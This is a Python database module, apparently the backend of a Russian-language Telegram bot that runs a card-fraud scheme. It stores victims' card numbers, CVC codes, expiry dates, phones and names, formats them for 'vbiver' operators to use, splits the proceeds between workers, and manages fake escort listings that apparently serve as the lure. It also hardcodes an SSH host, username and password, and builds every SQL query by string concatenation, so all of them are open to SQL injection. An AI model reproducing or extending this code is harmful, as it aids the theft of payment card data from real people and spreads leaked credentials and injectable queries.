import pymysql
from sshtunnel import SSHTunnelForwarder
import config
from util import fix_str
try:
    server = SSHTunnelForwarder(
        '188.225.24.157',
        ssh_username='fastuser',
        ssh_password='Akkerman123',
        remote_bind_address=('localhost', 3306)
    )
    server.start()
    conncetion = pymysql.connect(host=config.Host,password=config.password_db,user=config.user_db,port=server.local_bind_port,cursorclass=pymysql.cursors.DictCursor,database=config.name_db)
    print(fix_str('не проблеммы с БД'))
    cursor = conncetion.cursor()
except Exception as exc:
    print(fix_str('Проблеммы с БД'))
    print(exc)

def add_new_worker(id,username):
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "SELECT user_id FROM accounts;"
    cursor.execute(insect)
    data = cursor.fetchall()
    flag = 0
    for i in range(len(data)):
        if data[i]['user_id'] == id:
            flag = 1
    if flag != 1:
     try:
      insect = "INSERT INTO accounts (user_id,promocode,rank,username) VALUES('"+str(id)+"','"+str(id)+fix_str("','новичок','")+username+"');"
      cursor.execute(insect)
      conncetion.commit()
      conncetion.close()
      return True
     except Exception as exc:
        print(fix_str('ПРОБЛЕМЫ С БД!!!'),exc)
        return False
    else:
        return False

def get_worker():
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
     cursor = conncetion.cursor()
     insect = "SELECT user_id FROM accounts;"
     cursor.execute(insect)
     data = cursor.fetchall()
     res = []
     for i in range(len(data)):
         res.append(int(data[i]['user_id']))
     conncetion.close()
     return res
    except Exception as exc:
        return []
def make_zaivka(id,username):
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "SELECT id FROM zayvki;"
    cursor.execute(insect)
    data = cursor.fetchall()
    flag = 0
    for i in range(len(data)):
        if data[i]['id'] == str(id):
            flag = 1
            break
    if flag == 0:
        try:
            insect = "INSERT INTO zayvki (id,username) VALUES('" + str(id) + "','" + username + "');"
            cursor.execute(insect)
            conncetion.commit()
            conncetion.close()
            return True
        except Exception as exc:
            print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)
            conncetion.close()
            return False
    else:
        conncetion.close()
        return False

def get_zaivky():
    insect = "SELECT * FROM zayvki;"
    cursor.execute(insect)
    data = cursor.fetchall()
    return data
def block(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
        cursor = conncetion.cursor()
        insect = "INSERT INTO blacklist (id) VALUES('"+str(id)+"');"
        cursor.execute(insect)
        conncetion.commit()
        try:
          insect = "UPDATE accounts SET access = '-1' WHERE user_id = '" + str(id) + "';"
          cursor.execute(insect)
          conncetion.commit()
          conncetion.close()
        except Exception:
            pass
        return True
    except Exception as exc:
        print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)
        return False
def unblock(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
        cursor = conncetion.cursor()
        try:
          insect = "UPDATE accounts SET access = '0' WHERE user_id = '" + str(id) + "';"
          cursor.execute(insect)
          conncetion.commit()
          conncetion.close()
        except Exception:
            pass

        return True
    except Exception as exc:
        print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)

        return False

def get_blocked():
    try:
     insect = "SELECT user_id FROM accounts WHERE access = '-1';"
     cursor.execute(insect)
     data = cursor.fetchall()
     res = []
     for i in range(len(data)):
         res.append(int(data[i]['id']))
     return res
    except Exception as exc:
        return []

def Workers_Information():
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "SELECT * FROM accounts;"
    cursor.execute(insect)
    data = cursor.fetchall()
    conncetion.close()
    return data
def get_Worker_information(id):
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "SELECT * FROM accounts WHERE user_id = '"+str(id)+"';"
    cursor.execute(insect)
    data = cursor.fetchall()
    conncetion.close()
    return data


def set_city(id,city):
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "UPDATE accounts SET city = '"+city+"' WHERE user_id = '" + str(id) + "';"
    cursor.execute(insect)
    conncetion.commit()
    conncetion.close()
def get_referal(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
     cursor = conncetion.cursor()
     insect = "SELECT promocode FROM accounts WHERE user_id = "+str(id)+";"
     cursor.execute(insect)
     data = cursor.fetchall()

     res = []
     for i in range(len(data)):
         res.append(data[i]['promocode'])
     conncetion.close()
     return res[0]
    except Exception as exc:
        return []
def Worker_username(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
     cursor = conncetion.cursor()
     insect = "SELECT username FROM accounts WHERE user_id = '"+str(id)+"';"
     cursor.execute(insect)
     data = cursor.fetchall()
     res = []
     for i in range(len(data)):
         res.append(data[i]['username'])
     conncetion.close()
     return res[0]
    except Exception as exc:
        print(exc)
        return []


def get_city(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
     cursor = conncetion.cursor()
     insect = "SELECT city FROM accounts WHERE user_id = '"+str(id)+"';"
     cursor.execute(insect)
     data = cursor.fetchall()
     res = []
     for i in range(len(data)):
         res.append(data[i]['city'])
     conncetion.close()
     return res[0]
    except Exception as exc:
        print(exc)
        return []
def get_acses_level(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect = "SELECT access FROM accounts WHERE user_id = '"+str(id)+"';"
     cursor.execute(insect)
     data = cursor.fetchall()
     res = []
     for i in range(len(data)):
         res.append(int(data[i]['access']))
     conncetion.close()
     return res[0]
    except Exception as exc:
        print(exc)
        return []

def work_nowork(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect = "SELECT work_nowork FROM accounts WHERE user_id = '"+str(id)+"';"
     cursor.execute(insect)
     data = cursor.fetchall()
     if data[0]['work_nowork'] == 0:
         insect = "UPDATE accounts SET work_nowork = '1' WHERE user_id = '" + str(id) + "';"
         cursor.execute(insect)
         conncetion.commit()
         conncetion.close()
         return 1
     else:
         insect = "UPDATE accounts SET work_nowork = '0' WHERE user_id = '" + str(id) + "';"
         cursor.execute(insect)
         conncetion.commit()
         conncetion.close()
         return 0
    except Exception as exc:
        print(exc)


def adverts():
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT id FROM adverts;"
        cursor.execute(insect)
        data = cursor.fetchall()

        res = []
        for i in range(len(data)):
            res.append(data[i]['id'])
        conncetion.close()
        return res
    except Exception as exc:
        return []
def adverts1(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT type FROM adverts WHERE id = '"+str(id)+"';"
        cursor.execute(insect)
        data = cursor.fetchall()

        res = []
        for i in range(len(data)):
            res.append(data[i]['type'])
        conncetion.close()
        return res[0]
    except Exception as exc:
        return []
def Log_to_vbiver(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT code,cvv,data,worker,phone,name FROM adverts WHERE id = '"+str(id)+"';"
        cursor.execute(insect)
        data = cursor.fetchall()
        code = data[0]['code']
        cvv = data[0]['cvv']
        phone = data[0]['phone']
        name =  data[0]['name']
        date = data[0]['data']
        worker = int(data[0]['worker'])
        usr = Worker_username(worker)
        res = fix_str("➡️<b>Номер карты :</b> <code>") + code+fix_str(" </code>⬅️\n")
        res += fix_str("➡️<b>Номер телефона:</b> <code> ") + phone + fix_str(" </code> ⬅️\n")
        res += fix_str("➡️<b>Имя:</b> <code> ") + name + fix_str(" </code> ⬅️\n")
        res += fix_str("➡️<b>CVC:</b> <code> ")+cvv+fix_str(" </code> ⬅️\n")
        res += fix_str("➡️<b>mm/yy:</b> <code> ")+date+fix_str(" </code> ⬅️\n")
        res += fix_str("➡️<b>Воркер:</b> @") + usr + fix_str(" ⬅️\n")
        res += fix_str("📟<b>ID - ")+ str(id)+fix_str("</b> 📟")
        conncetion.close()
        return res
    except Exception as exc:
        print(exc)
        return fix_str('Ошибка')
def Log_to_TS(id,type,price):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT vbiver,worker FROM adverts WHERE id = '"+str(id)+"';"
        cursor.execute(insect)
        data = cursor.fetchall()
        vbiver  = int(data[0]['vbiver'])
        worker = int(data[0]['worker'])
        usr = Worker_username(worker)
        vb = Worker_username(vbiver)
        res = fix_str('❗️<b>Новая Оплата</b>❗️\n\n')
        res +=fix_str('     👨‍💻<b>Вбивер:</b> @') + vb+'\n\n'
        res += fix_str('     🦺<b>Воркер: </b> @') + usr + '\n\n'
        res +=fix_str('     💰<b>Профит: ') + str(price)+fix_str('</b>₽\n\n')
        res += fix_str('     <b>💼Тип оплаты:</b> ')+ type
        conncetion.close()
        return res
    except Exception as exc:
        print(exc)
        return []


def Status_of_advert(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT status FROM adverts WHERE id = '"+str(id)+"';"
        cursor.execute(insect)
        data = cursor.fetchall()
        res = data[0]['status']
        conncetion.close()
        return res
    except Exception as exc:
        print(exc)
        return []

def adverts2(id,type):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                  cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect = "UPDATE adverts SET type = '"+type+"' WHERE id = '" + str(id) + "';"
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)

def addvbiver_to_advert(id,vbiver):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                  cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect = "UPDATE adverts SET status='1',vbiver='"+str(vbiver)+"' WHERE id = '" + str(id) + "';"
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)

def make_vbiver(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
     cursor = conncetion.cursor()
     insect = "UPDATE accounts SET access = '1' WHERE user_id = '" + str(id) + "';"
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception:
        pass

def stats(id):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

        cursor = conncetion.cursor()
        insect = "SELECT time FROM stats WHERE id = '" + str(id) + "';"
        cursor.execute(insect)
        data = cursor.fetchall()
        res = []
        day = 0
        week = 0
        month = 0
        conncetion.close()
        last = int(data[len(data)-1]['time'])
        for i in range(len(data)):
            if last - int(data[i]['time']) < 86400:
                day +=1
                week +=1
                month+=1
            elif 86400<=last - int(data[i]['time']) < 604800:
                month += 1
                week += 1
            elif 604800 <= int(last - data[i]['time'] )< 2592000:
                month+=1
        return [day,week,month]
    except Exception as exc:
        return [0,0,0]


def add_profit(id,procent_vb,procent_wrk):
    try:
        conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database=config.name_db)


        cursor = conncetion.cursor()
        insect = "SELECT price,worker,vbiver FROM adverts WHERE id = '"+str(id)+"';"
        cursor.execute(insect)
        data = cursor.fetchall()
        worker = data[0]['worker']
        vbiver = data[0]['vbiver']
        price = data[0]['price']
        insect6 = "SELECT profit_sum FROM accounts WHERE user_id = '" + worker + "';"
        cursor.execute(insect6)
        data1 = cursor.fetchall()
        pr_wr_prc = data1[0]['profit_sum']
        insect6 = "SELECT profit_sum FROM accounts WHERE user_id = '" + vbiver + "';"
        cursor.execute(insect6)
        data1 = cursor.fetchall()
        pr_vb_prc = data1[0]['profit_sum']
        wr_prc = int(price * (procent_wrk/100))
        vb_prc = int(price * (procent_vb/100))
        tc_prc = int(price*((100-procent_wrk-procent_vb)/100))
        insect1 = "UPDATE accounts SET profit_sum = "+str(wr_prc+pr_wr_prc)+" WHERE user_id = '" + worker + "';"
        cursor.execute(insect1)
        conncetion.commit()
        insect2 = "UPDATE accounts SET profit_sum = " + str(vb_prc+ pr_vb_prc) + " WHERE user_id = '" + vbiver + "';"
        cursor.execute(insect2)
        conncetion.commit()
        conncetion.close()
        return [[price],[Worker_username(int(worker)),Worker_username(int(vbiver))]]



    except Exception as exc:
        print(exc)
        return []

def delete_advert(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                 port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect = "DELETE FROM adverts WHERE id = "+str(id)
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)

def add_model(name,old,height,weight,breast,hair_color,nationality,appearance,price_hour,price_2hour,night,images,images_2,images_3,status_woman,ref):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                 port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database='passion_girls_db')

     cursor = conncetion.cursor()
     insect = "INSERT INTO items (name,old,height,weight,breast,hair_color,nationality,appearance,price_hour,price_2hour,night,images,images_2,images_3,status_woman,ref) VALUES('"+name+"','"+old+"','"+height+"','"+weight+"','"+breast+"','"+hair_color+"','"+nationality+"','"+appearance+"','"+price_hour+"','"+price_2hour+"','"+night+"','"+images+"','"+images_2+"','"+images_3+"','"+status_woman+"','"+str(ref)+"');"
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)

def get_models(ref):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                 port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database='passion_girls_db')

     cursor = conncetion.cursor()
     insect = "SELECT id,name,old FROM items WHERE ref = '" + str(ref) + "';"
     cursor.execute(insect)
     data1 = cursor.fetchall()

     conncetion.close()
     return data1
    except Exception as exc:
        print(exc)
def delete_model(id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                     port=server.local_bind_port,
                                     cursorclass=pymysql.cursors.DictCursor, database='passion_girls_db')

     cursor = conncetion.cursor()
     insect = "DELETE FROM items WHERE id = "+str(id)
     cursor.execute(insect)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)

def get_vbivers_onwork():
    conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                 port=server.local_bind_port,
                                 cursorclass=pymysql.cursors.DictCursor, database=config.name_db)
    cursor = conncetion.cursor()
    insect = "SELECT * FROM accounts WHERE work_nowork = '1';"
    cursor.execute(insect)
    data = cursor.fetchall()
    res = []
    for i in data:
        res.append(i['username'])
    conncetion.close()
    return res

def make_profit(profit,id):
    try:
     conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db,
                                  port=server.local_bind_port,
                                  cursorclass=pymysql.cursors.DictCursor, database=config.name_db)

     cursor = conncetion.cursor()
     insect1 = "UPDATE adverts SET price = " + str(profit) + " WHERE id = '" + str(id) + "';"
     cursor.execute(insect1)
     conncetion.commit()
     conncetion.close()
    except Exception as exc:
        print(exc)